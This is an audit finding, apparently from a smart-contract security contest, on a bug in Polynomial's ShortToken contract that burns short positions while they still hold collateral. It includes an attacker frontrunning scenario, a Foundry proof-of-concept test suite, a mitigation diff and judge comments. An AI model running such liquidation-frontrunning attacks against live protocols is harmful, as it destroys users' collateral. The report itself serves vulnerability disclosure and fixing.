[H-03] Short positions can be burned while holding collateral
Submitted byMiloTruck, also found bybin2chen,chaduke,0x52,Bauer, and0xRobocop
Users can permanently lose a portion of their collateral due to a malicious attacker or their own mistake.
Vulnerability Details
In theShortTokencontract,adjustPosition()is used to handle changes to a short position’s short or collateral amounts. The function also handles the burning of positions with the following logic:
position.collateralAmount=collateralAmount;position.shortAmount=shortAmount;if(position.shortAmount==0) {_burn(positionId);}
Where:
collateralAmount- New amount of collateral in a position.shortAmount- New short amount of a position.positionId- ERC721ShortTokenof a short position.
As seen from above, if a position’sshortAmountis set to 0, it will be burned. Furthermore, as the code does not ensurecollateralAmountis not 0 before burning, it is possible to burn a position while it still has collateral.
If this occurs, the position’s owner will lose all remaining collateral in the position. This remaining amount will forever be stuck in the position as its correspondingShortTokenno longer has an owner.
Proof of Concept
In theExchangecontract, users can reduce a position’sshortAmountusingcloseTrade()(Exchange.sol#L100-L109) andliquidate()(Exchange.sol#L140-L148). With these two functions, there are three realistic scenarios where a position with collateral could be burned.
1. User reduces his position’sshortAmountto 0
A user might callcloseTrade()on a short position with the following parameters:
params.amount- Set to the position’s short amount.params.collateralAmount- Set to any amount less than the position’s total collateral amount.
This would reduce his position’sshortAmountto 0 without withdrawing all of its collateral, causing him to lose the remaining amount.
Although this could be considered a user mistake, such a scenario could occur if a user does not want to hold a short position temporarily without fully withdrawing his collateral.
2. Attacker fully liquidates a short position
In certain situations, it is possible for a short position to have collateral remaining after a full liquidation (example in the coded PoC below). This collateral will be lost as full liquidations reduces a position’sshortAmountto 0, thereby burning the position.
3. Attacker frontruns a user’scloseTrade()transaction with a liquidation
Consider the following scenario:
Alice has an unhealthy short position that is under the liquidation ratio and can be fully liquidated.To bring her position back above the liquidation ratio, Alice decides to partially reduce its short amount. She callscloseTrade()on her position with the following parameters:params.amount- Set to 40% of the position’s short amount.params.collateralAmount- Set to 0.A malicious attacker, Bob, sees hercloseTrade()transaction in the mempool.Bob frontruns the transaction, callingliquidate()with the following parameters:positionId- ID of Alice’s position.debtRepaying- Set to 60% of Alice’s position’s short amount.Bob’sliquidate()transaction executes first, reducing the short amount of Alice’s position to 40% of the original amount.Alice’scloseTrade()transaction executes, reducing her position’s short amount by 40% of the original amount, thus itsshortAmountbecomes 0.
In the scenario above, Alice loses the remaining collateral in her short position as it is burned aftercloseTrade()executes.
Note that this attack is possible as long as an attacker can liquidate the position’s remaining short amount. For example, if Alice callscloseTrade()with 70% of the position’s short amount, Bob only has to liquidate 30% of its short amount.
Coded PoC
The code below contains three tests that demonstrates the scenarios above:
testCloseBurnsCollateral()testLiquidateBurnsCollateral()testAttackerFrontrunLiquidateBurnsCollateral()
// SPDX-License-Identifier: MITpragmasolidity^0.8.9;import{TestSystem,Exchange,ShortToken,ShortCollateral,MockERC20Fail}from"./utils/TestSystem.sol";contractPositionWithCollateralBurnedisTestSystem{// Protocol contractsExchangeprivateexchange;ShortTokenprivateshortToken;ShortCollateralprivateshortCollateral;// sUSD token contractMockERC20FailprivateSUSD;// Intial base asset priceuint256privateconstantinitialBaseAssetPrice=1e18;// UsersaddressprivateUSER=user_1;addressprivateATTACKER=user_2;functionsetUp()public{// Deploy contractsdeployTestSystem();initPool();initExchange();preparePool();exchange=getExchange();shortToken=getShortToken();shortCollateral=getShortCollateral();SUSD=getSUSD();// Set initial price for base assetsetAssetPrice(initialBaseAssetPrice);// Mint sUSD for USERSUSD.mint(USER,1e20);// Mint powerPerp for ATTACKERvm.prank(address(exchange));getPowerPerp().mint(ATTACKER,1e20);}functiontestCloseBurnsCollateral()public{// Open short positionuint256shortAmount=1e18;uint256collateralAmount=1e15;uint256positionId=openShort(shortAmount,collateralAmount,USER);// Fully close position without withdrawing any collateralcloseShort(positionId,shortAmount,0,USER);// positionId still holds 1e15 sUSD as collateral(,,uint256remainingCollateralAmount, ) =shortToken.shortPositions(positionId);assertEq(remainingCollateralAmount,collateralAmount);// positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")vm.expectRevert("NOT_MINTED");shortToken.ownerOf(positionId);}functiontestLiquidateBurnsCollateral()public{// USER opens short position with amount = 1e18, collateral amount = 1e15uint256shortAmount=1e18;uint256positionId=openShort(1e18,1e15,USER);// Base asset price rises by 35%setAssetPrice(initialBaseAssetPrice*135/100);// USER's entire short position is liquidatableassertEq(shortCollateral.maxLiquidatableDebt(positionId),shortAmount);// ATTACKER liquidates USER's entire short positionvm.prank(ATTACKER);exchange.liquidate(positionId,shortAmount);// positionId has no remaining debt, but still holds some collateral(,uint256remainingAmount,uint256remainingCollateralAmount, ) =shortToken.shortPositions(positionId);assertEq(remainingAmount,0);assertGt(remainingCollateralAmount,0);// positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")vm.expectRevert("NOT_MINTED");shortToken.ownerOf(positionId);}functiontestAttackerFrontrunLiquidateBurnsCollateral()public{// USER opens short position with amount = 1e18, collateral amount = 1e15uint256shortAmount=1e18;uint256positionId=openShort(1e18,1e15,USER);// Base asset price rises by 40%setAssetPrice(initialBaseAssetPrice*140/100);// USER's short position is liquidatableassertEq(shortCollateral.maxLiquidatableDebt(positionId),shortAmount);// ATTACKER frontruns USER's closeTrade() transaction, liquidating 60% of USER's amountvm.prank(ATTACKER);exchange.liquidate(positionId,shortAmount*60/100);// USER's closeTrade() transaction executes, reducing shortAmount by the remaining 40%closeShort(positionId,shortAmount*40/100,0,USER);// positionId has no remaining debt, but still holds some collateral(,uint256remainingAmount,uint256remainingCollateralAmount, ) =shortToken.shortPositions(positionId);assertEq(remainingAmount,0);assertGt(remainingCollateralAmount,0);// positionId is already burned (ie. ownerOf reverts with "NOT_MINTED")vm.expectRevert("NOT_MINTED");shortToken.ownerOf(positionId);}functionopenShort(uint256amount,uint256collateralAmount,addressuser)internalreturns(uint256positionId) {Exchange.TradeParamsmemorytradeParams;tradeParams.amount=amount;tradeParams.collateral=address(SUSD);tradeParams.collateralAmount=collateralAmount;vm.startPrank(user);SUSD.approve(address(exchange),collateralAmount);(positionId, ) =exchange.openTrade(tradeParams);vm.stopPrank();}functioncloseShort(uint256positionId,uint256amount,uint256collateralAmount,addressuser)internal{Exchange.TradeParamsmemorytradeParams;tradeParams.amount=amount;tradeParams.collateral=address(SUSD);tradeParams.collateralAmount=collateralAmount;tradeParams.maxCost=100e18;tradeParams.positionId=positionId;vm.startPrank(user);SUSD.approve(address(getPool()),tradeParams.maxCost);exchange.closeTrade(tradeParams);vm.stopPrank();}}
Recommended Mitigation
Ensure that positions cannot be burned if they have any collateral:
-            if (position.shortAmount == 0) {+            if (position.shortAmount == 0 && position.collateralAmount == 0) {_burn(positionId);}
mubaris (Polynomial) confirmed via duplicate issue#65
Dravee (judge) commented:
The 3rd scenario isn’t likely due to frontrunning not being an issue on Optimism.This report still brings the most value and is the most well presented.